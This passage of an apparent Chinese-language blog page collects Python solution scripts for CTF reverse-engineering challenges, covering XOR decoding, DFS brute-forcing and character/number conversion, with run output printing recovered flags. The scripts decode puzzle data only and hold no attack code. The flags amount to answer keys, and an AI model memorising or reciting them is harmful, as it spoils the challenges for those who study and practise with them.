<span class="number">34</span>, <span class="number">206</span>, <span class="number">113</span>, <span class="number">188</span>, <span class="number">245</span>, <span class="number">84</span>, <span class="number">115</span>, <span class="number">82</span>, <span class="number">200</span>, <span class="number">96</span>, <span class="number">223</span>, <span class="number">47</span>, <span class="number">26</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">49</span>, <span class="number">13</span>, <span class="number">187</span>, <span class="number">23</span>, <span class="number">33</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">46</span>, <span class="number">124</span>, <span class="number">108</span>, <span class="number">159</span>, <span class="number">65</span>, <span class="number">155</span>, <span class="number">129</span>, <span class="number">79</span>, <span class="number">51</span>, <span class="number">199</span>, <span class="number">0</span>, <span class="number">168</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">169</span>, <span class="number">63</span>, <span class="number">192</span>, <span class="number">89</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">182</span>, <span class="number">88</span>, <span class="number">226</span>, <span class="number">184</span>, <span class="number">111</span>, <span class="number">50</span>, <span class="number">148</span>, <span class="number">183</span>, <span class="number">176</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">152</span>, <span class="number">24</span>, <span class="number">91</span>, <span class="number">156</span>, <span class="number">73</span>, <span class="number">218</span>, <span class="number">39</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">44</span>, <span class="number">252</span>, <span class="number">102</span>, <span class="number">196</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">135</span>, <span class="number">2</span>, <span class="number">104</span>, <span class="number">185</span>, <span class="number">78</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">170</span>, <span class="number">11</span>, <span class="number">179</span>, <span class="number">224</span>, <span class="number">138</span>, <span class="number">30</span>, <span class="number">207</span>, <span class="number">66</span>, <span class="number">107</span>, <span class="number">60</span>, <span class="number">202</span>, <span class="number">167</span>, <span class="number">139</span>, <span class="number">56</span>, <span class="number">128</span>, <span class="number">83</span>, <span class="number">175</span>, <span class="number">144</span>, <span class="number">100</span>, <span class="number">253</span>, <span class="number">72</span>, <span class="number">219</span>, <span class="number">190</span>, <span class="number">80</span>, <span class="number">130</span>, <span class="number">126</span>, <span class="number">7</span>, <span class="number">90</span>, <span class="number">15</span>, <span class="number">164</span>, <span class="number">174</span>, <span class="number">151</span>, <span class="number">150</span>, <span class="number">198</span>, <span class="number">239</span>, <span class="number">157</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">197</span>, <span class="number">32</span>, <span class="number">101</span>, <span class="number">142</span>, <span class="number">244</span>, <span class="number">225</span>, <span class="number">203</span>, <span class="number">116</span>, <span class="number">12</span>, <span class="number">231</span>, <span class="number">161</span>, <span class="number">98</span>, <span class="number">16</span>, <span class="number">162</span>, <span class="number">201</span>, <span class="number">209</span>, <span class="number">163</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">165</span>, <span class="number">255</span>, <span class="number">71</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">235</span>, <span class="number">112</span>, <span class="number">21</span>, <span class="number">215</span>, <span class="number">36</span>, <span class="number">173</span>, <span class="number">53</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">20</span>, <span class="number">236</span>, <span class="number">45</span>, <span class="number">242</span>, <span class="number">254</span>, <span class="number">213</span>, <span class="number">180</span>, <span class="number">52</span>, <span class="number">181</span>, <span class="number">221</span>, <span class="number">154</span>, <span class="number">4</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">193</span>, <span class="number">62</span>, <span class="number">93</span>, <span class="number">1</span>, <span class="number">248</span>, <span class="number">238</span>, <span class="number">37</span>, <span class="number">8</span>, <span class="number">110</span>, <span class="number">208</span>, <span class="number">67</span>, <span class="number">222</span>, <span class="number">42</span>, <span class="number">178</span>, <span class="number">194</span>, <span class="number">133</span>, <span class="number">18</span>, <span class="number">186</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">147</span>, <span class="number">177</span>, <span class="number">171</span>, <span class="number">48</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">212</span>, <span class="number">81</span>, <span class="number">123</span>, <span class="number">136</span>, <span class="number">233</span>, <span class="number">10</span>, <span class="number">114</span>, <span class="number">210</span>, <span class="number">250</span>, <span class="number">99</span>, <span class="number">214</span>, <span class="number">220</span>, <span class="number">120</span>, <span class="number">227</span>, <span class="number">54</span>, <span class="number">64</span>, <span class="number">59</span>, <span class="number">103</span>, <span class="number">94</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">117</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">240</span>, <span class="number">172</span>, <span class="number">205</span>, <span class="number">153</span>, <span class="number">35</span>, <span class="number">74</span>, <span class="number">131</span>, <span class="number">251</span>, <span class="number">137</span>, <span class="number">243</span>, <span class="number">19</span>, <span class="number">9</span>, <span class="number">232</span>, <span class="number">191</span>, <span class="number">95</span>, <span class="number">6</span>, <span class="number">204</span>, <span class="number">121</span>, <span class="number">234</span>, <span class="number">158</span>, <span class="number">68</span>, <span class="number">145</span>, <span class="number">228</span>, <span class="number">237</span>, <span class="number">125</span>, <span class="number">57</span>, <span class="number">195</span>, <span class="number">40</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">调用解密程序成功。</span><br><span class="line"></span><br><span class="line">res用于解密字符串，解密后是：[<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]es</span><br><span class="line"></span><br><span class="line">解密后的字符串是：flag&#123;RC_f0ur_And_Base_s1xty_f0ur_Encrypt_!&#125;</span><br><span class="line"></span><br><span class="line">解密后的输出(没经过任何编码):</span><br><span class="line"></span><br><span class="line">进程已结束,退出代码<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="DFS解密脚本示例"><a href="#DFS解密脚本示例" class="headerlink" title="DFS解密脚本示例"></a>DFS解密脚本示例</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">str2=[<span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x0F</span>, <span class="number">0xF8</span>, <span class="number">0x19</span>, <span class="number">0x04</span>, <span class="number">0x27</span>, <span class="number">0xD8</span>, <span class="number">0xEB</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x35</span>, <span class="number">0x48</span>, <span class="number">0x4D</span>, <span class="number">0x2A</span>, <span class="number">0x45</span>, <span class="number">0x6B</span>, <span class="number">0x59</span>, <span class="number">0x2E</span>, <span class="number">0x43</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x5C</span>, <span class="number">0x09</span>, <span class="number">0x09</span>, <span class="number">0x09</span>, <span class="number">0x09</span>, <span class="number">0xB5</span>, <span class="number">0x7D</span>]</span><br><span class="line">tmp=[<span class="number">0</span>]*<span class="number">28</span></span><br><span class="line">tmp[<span class="built_in">len</span>(str2)-<span class="number">1</span>]=str2[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DFS</span>(<span class="params">deep</span>):</span><br><span class="line">    <span class="keyword">if</span> deep==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>(tmp))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">            <span class="keyword">if</span>(i^<span class="number">0x19</span>)^(i%<span class="number">0x11</span>+tmp[deep]) == str2[deep-<span class="number">1</span>]:</span><br><span class="line">                tmp[deep-<span class="number">1</span>]=i</span><br><span class="line">                DFS(deep-<span class="number">1</span>)</span><br><span class="line">DFS(<span class="built_in">len</span>(str2)-<span class="number">1</span>) </span><br></pre></td></tr></table></figure></div><h1 id="基础脚本整理"><a href="#基础脚本整理" class="headerlink" title="基础脚本整理"></a>基础脚本整理</h1><h2 id="数字异或Ⅰ"><a href="#数字异或Ⅰ" class="headerlink" title="数字异或Ⅰ"></a>数字异或Ⅰ</h2><p>exp_begin.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">str2 = [<span class="number">116</span>, <span class="number">118</span>, <span class="number">124</span>, <span class="number">122</span>, <span class="number">109</span>, <span class="number">127</span>,  <span class="number">98</span>,  <span class="number">65</span>,  <span class="number">41</span>, <span class="number">107</span>, </span><br><span class="line">   <span class="number">70</span>,  <span class="number">40</span>, <span class="number">106</span>,  <span class="number">70</span>, <span class="number">106</span>,  <span class="number">41</span>,  <span class="number">70</span>, <span class="number">112</span>, <span class="number">119</span>, <span class="number">109</span>, </span><br><span class="line">   <span class="number">42</span>, <span class="number">107</span>,  <span class="number">42</span>, <span class="number">106</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">119</span>, <span class="number">126</span>,  <span class="number">56</span>,  <span class="number">56</span>, </span><br><span class="line">   <span class="number">56</span>,  <span class="number">56</span>,  <span class="number">56</span>, <span class="number">100</span>] </span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(str2[i]^<span class="number">0x19</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>exp_int-char.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc=(<span class="number">65</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">93</span>, <span class="number">114</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">91</span>, <span class="number">86</span>, <span class="number">96</span>, <span class="number">60</span>, <span class="number">86</span>, <span class="number">100</span>, <span class="number">102</span>, </span><br><span class="line">     <span class="number">123</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">64</span>, <span class="number">103</span>, <span class="number">125</span>, <span class="number">108</span>, <span class="number">123</span>, <span class="number">108</span>, <span class="number">122</span>, <span class="number">125</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">110</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">116</span>)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(enc[i]^<span class="number">0x9</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><h2 id="数字异或Ⅱ"><a href="#数字异或Ⅱ" class="headerlink" title="数字异或Ⅱ"></a>数字异或Ⅱ</h2><p>多个数列异或处理</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0x15</span>, <span class="number">0x21</span>, <span class="number">0x0F</span>, <span class="number">0x19</span>, <span class="number">0x25</span>, <span class="number">0x5B</span>, <span class="number">0x19</span>, <span class="number">0x39</span>, <span class="number">0x5F</span>, <span class="number">0x3A</span>, </span><br><span class="line">  <span class="number">0x3B</span>, <span class="number">0x30</span>, <span class="number">0x74</span>, <span class="number">0x07</span>, <span class="number">0x43</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x5A</span>, <span class="number">0x34</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x74</span>, <span class="number">0x3F</span>, <span class="number">0x1E</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x21</span>, <span class="number">0x12</span>, <span class="number">0x16</span>, <span class="number">0x1F</span>]</span><br><span class="line">key=<span class="string">b&#x27;yunzh1junTCL,trackYYDS&#x27;</span></span><br><span class="line"></span><br><span class="line">add1=[  <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x5D</span>, <span class="number">0x4E</span>, <span class="number">0x5D</span>, <span class="number">0x07</span>, <span class="number">0x5D</span>, <span class="number">0x4D</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, </span><br><span class="line">  <span class="number">0x71</span>, <span class="number">0x7F</span>, <span class="number">0x18</span>, <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x56</span>, <span class="number">0x5B</span>, <span class="number">0x52</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, </span><br><span class="line">  <span class="number">0x77</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x43</span>, <span class="number">0x59</span>, <span class="number">0x42</span>, <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x58</span>]</span><br><span class="line">add2=[ <span class="number">0x49</span>, <span class="number">0x4E</span>, <span class="number">0x61</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0x0B</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x59</span>, <span class="number">0x69</span>, </span><br><span class="line">  <span class="number">0x76</span>, <span class="number">0x84</span>, <span class="number">0x19</span>, <span class="number">0x48</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x6F</span>, <span class="number">0x71</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x6B</span>, <span class="number">0x4E</span>, <span class="number">0x46</span>, <span class="number">0x5B</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0x06</span>, <span class="number">0x60</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>((enc[i] - add2[i] + add1[i]) ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><h2 id="数字与字符串拼接异或处理Ⅲ"><a href="#数字与字符串拼接异或处理Ⅲ" class="headerlink" title="数字与字符串拼接异或处理Ⅲ"></a>数字与字符串拼接异或处理Ⅲ</h2><h3 id="exp-S1xor1-py"><a href="#exp-S1xor1-py" class="headerlink" title="exp_S1xor1.py"></a>exp_S1xor1.py</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="string">&#x27;f&#x27;</span>,<span class="number">0x0A</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0x0C</span>,<span class="string">&#x27;w&amp;O.@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0x0D</span>,</span><br><span class="line">       <span class="string">&#x27;Z;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&quot;M#D&#x27;</span>,<span class="number">0x0E</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">0x6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0x0F</span>,<span class="string">&#x27;G2O&#x27;</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(enc[i])==<span class="built_in">int</span>: <span class="comment">#将数字转化成字符</span></span><br><span class="line">        enc[i] = <span class="built_in">chr</span>(enc[i]) </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">enc =<span class="string">&quot;&quot;</span>.join(enc)</span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enc)):     <span class="comment">##范围是从第1位一直到字符的最后一位</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i])^<span class="built_in">ord</span>(enc[i-<span class="number">1</span>]))  <span class="comment">##ord()函数是将字符串转为整数的函数</span></span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment">##打印flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##result</span></span><br><span class="line">D:\CollegeStudy\Python_code\venv\Scripts\python.exe D:/CTF_Tools/0_CTF_Scripts/BuuCTF_Test/S1xor1.py</span><br><span class="line">flag&#123;QianQiuWanDai_YiTongJiangHu&#125;O</span><br><span class="line"></span><br><span class="line">进程已结束,退出代码<span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>将enc字符串处理好之后，使用<code>chr()</code>函数将<code>enc</code>中所有的数字转为字符，接着做数列的拼接</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enclist =<span class="string">&quot;&quot;</span>.join(enc)</span><br><span class="line">flag = <span class="string">&#x27;f&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(enclist)):     <span class="comment">##范围是从第1位一直到字符的最后一位</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enclist[i])^<span class="built_in">ord</span>(enclist[i-<span class="number">1</span>]))  <span class="comment">##ord()函数是将字符串转为整数的函数</span></span><br><span class="line"><span class="built_in">print</span>(flag) <span class="comment">##打印flag</span></span><br></pre></td></tr></table></figure></div><p>Code2将代码1中enc改为了enclist，即第二个enclist是为由字符串组成的序列元素，生成一个新的字符串enclist</p><h3 id="exp-S11-py"><a href="#exp-S11-py" class="headerlink" title="exp_S11.py"></a>exp_S11.py</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">f1 = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line">f2 = [<span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x6F</span>, <span class="number">0x66</span>, <span class="number">0x7F</span>] <span class="comment">#这里用的是第二种方法转换</span></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">2</span>)==<span class="number">1</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(f2[i]-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(f2[i]-<span class="number">1</span>)  <span class="comment">#别忘了将转回字符串</span></span><br><span class="line"><span class="built_in">print</span>(f1+temp)</span><br></pre></td></tr></table></figure></div><p>Code3使用的是分离的方式来求最后的flag值，直接对f2的数组进行处理后与f1拼接</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">f2 = <span class="string">&#x27;\x7Ffo`guci&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">f2a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        f2a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[i]) - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f2a += <span class="built_in">chr</span>(<span class="built_in">ord</span>(f2[i]) - <span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">flag = <span class="string">&#x27;GXY&#123;do_not_&#x27;</span>+f2a </span><br><span class="line"><span class="built_in">print</span>(flag )</span><br></pre></td></tr></table></figure></div><p>Code4也是使用的是分离的方式来求最后的flag值，先将f2逆序，接着处理。</p><h2 id="字符转数字Ⅰ—同理可以异或处理"><a href="#字符转数字Ⅰ—同理可以异或处理" class="headerlink" title="字符转数字Ⅰ—同理可以异或处理"></a>字符转数字Ⅰ—同理可以异或处理</h2><p>进行异或exp_16.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = (<span class="string">&quot;AP@]rQF[V`&lt;Vdf&#123;lV@g&#125;l&#123;lz&#125;`gn(((t&quot;</span>)</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> enc:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(character))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><p>exp_key18.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc =<span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> character <span class="keyword">in</span> enc:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(character))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">##reslut</span></span><br><span class="line">D:\CollegeStudy\Python_code\venv\Scripts\python.exe D:/CTF_Tools/0_CTF_Scripts/BuuCTF_Test/mytest.py</span><br><span class="line">[<span class="number">81</span>, <span class="number">115</span>, <span class="number">119</span>, <span class="number">51</span>, <span class="number">115</span>, <span class="number">106</span>, <span class="number">95</span>, <span class="number">108</span>, <span class="number">122</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">106</span>, <span class="number">119</span>, <span class="number">64</span>, <span class="number">108</span>]</span><br><span class="line">进程已结束,退出代码<span class="number">0</span></span><br></pre></td></tr></table></figure></div><p>两篇脚本使用的都是python中的append函数，将提供的enc字符转为数字，调试时注意到<code>flag=[]</code> 和<code>flag=&quot;&quot;</code> 分别对应求解flag的类型<code>数字</code>和<code>字符串</code></p><h2 id="数字转字符Ⅱ"><a href="#数字转字符Ⅱ" class="headerlink" title="数字转字符Ⅱ"></a>数字转字符Ⅱ</h2><p>exp_key.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line">key=[<span class="number">109</span>,<span class="number">111</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>,<span class="number">68</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">67</span>,<span class="number">95</span>,<span class="number">115</span>,<span class="number">104</span></span><br><span class="line">,<span class="number">97</span>,<span class="number">114</span>,<span class="number">112</span>,<span class="number">33</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(key[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ec = [<span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span>]</span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ec)):</span><br><span class="line">    tmp += <span class="built_in">chr</span>(ec[i])</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure></div><h2 id="base64字符处理"><a href="#base64字符处理" class="headerlink" title="base64字符处理"></a>base64字符处理</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;e3nifIH9b_C@n@dH&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">index = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):   <span 